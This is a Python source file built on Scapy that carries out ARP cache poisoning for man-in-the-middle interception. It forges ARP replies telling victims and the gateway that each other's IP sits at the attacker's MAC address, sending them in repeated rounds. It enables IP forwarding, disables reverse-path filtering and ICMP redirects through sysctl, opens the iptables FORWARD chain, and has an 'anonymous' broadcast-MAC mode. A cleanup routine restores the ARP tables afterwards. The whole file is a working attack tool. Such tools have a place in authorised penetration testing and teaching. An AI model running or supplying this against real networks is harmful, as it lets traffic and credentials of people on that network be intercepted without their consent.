import os
import time
from scapy.all import ARP, Ether, sendp

def build_arp_packet(src_ip, src_mac, dst_ip, dst_mac):
    """
    Construct an ARP reply packet.
    src_ip  – the IP address we're claiming (gateway or victim)
    src_mac – the MAC address we're using as sender
    dst_ip  – the target IP to poison
    dst_mac – the target's MAC address
    """
    ethernet = Ether(src=src_mac, dst=dst_mac)
    arp_layer = ARP(
        op=2,            # ARP reply
        psrc=src_ip,
        hwsrc=src_mac,
        pdst=dst_ip,
        hwdst=dst_mac
    )
    return ethernet / arp_layer

def start_arp_spoofing(
    targets,
    gateway_ip, gateway_mac,
    attacker_mac,
    iface,
    stop_event,
    interval=2,
    anonymous=False
):
    """
    Poison ARP tables for each victim<->gateway pair and ensure forwarding.

    targets      – list of (victim_ip, victim_mac)
    gateway_ip   – router IP address
    gateway_mac  – router MAC address
    attacker_mac – this host’s MAC address
    iface        – interface to use
    stop_event   – threading.Event to signal stopping
    interval     – seconds between spoof rounds
    anonymous    – if True, use broadcast MAC instead of attacker_mac
    """
    mode = "Anonymous SMITM" if anonymous else "Normal MITM"
    print("[*] ARP spoofing started.")
    print("    Mode: {}".format(mode))
    print("    Interval: {}s".format(interval))

    # -- enable forwarding and disable ICMP redirects and rp_filter --
    print("[*] Enabling IP forwarding and disabling ICMP redirects/rp_filter...")
    os.system("sysctl -w net.ipv4.ip_forward=1")
    os.system("sysctl -w net.ipv4.conf.all.rp_filter=0")
    os.system("sysctl -w net.ipv4.conf.{}.rp_filter=0".format(iface))
    os.system("sysctl -w net.ipv4.conf.all.send_redirects=0")
    os.system("sysctl -w net.ipv4.conf.{}.send_redirects=0".format(iface))
    os.system("iptables -P FORWARD ACCEPT")

    def send_round():
        """Send spoofed ARP replies to victims and the gateway."""
        for victim_ip, victim_mac in targets:
            fake_mac = "ff:ff:ff:ff:ff:ff" if anonymous else attacker_mac

            # tell victim the gateway IP is at fake_mac
            pkt_v = build_arp_packet(
                src_ip=gateway_ip, src_mac=fake_mac,
                dst_ip=victim_ip, dst_mac=victim_mac
            )
            # tell gateway the victim IP is at fake_mac
            pkt_g = build_arp_packet(
                src_ip=victim_ip, src_mac=fake_mac,
                dst_ip=gateway_ip, dst_mac=gateway_mac
            )

            sendp(pkt_v, iface=iface, verbose=False)
            sendp(pkt_g, iface=iface, verbose=False)
            print("[+] Sent ARP spoof to {} and gateway".format(victim_ip))

    try:
        while not stop_event.is_set():
            send_round()
            time.sleep(interval)
    except Exception as e:
        print("[!] ARP spoofing error: {}".format(e))
    finally:
        print("[*] Cleaning up: restoring ARP tables...")
        restore_all_arp(targets, gateway_ip, gateway_mac, iface)
        print("[+] ARP tables restored.")

def restore_all_arp(targets, gateway_ip, gateway_mac, iface):
    """
    Send correct ARP replies multiple times to undo poisoning.
    """
    for victim_ip, victim_mac in targets:
        correct_to_victim = build_arp_packet(
            src_ip=gateway_ip, src_mac=gateway_mac,
            dst_ip=victim_ip, dst_mac=victim_mac
        )
        correct_to_gateway = build_arp_packet(
            src_ip=victim_ip, src_mac=victim_mac,
            dst_ip=gateway_ip, dst_mac=gateway_mac
        )
        for _ in range(5):
            sendp(correct_to_victim, iface=iface, verbose=False)
            sendp(correct_to_gateway, iface=iface, verbose=False)
            time.sleep(1)
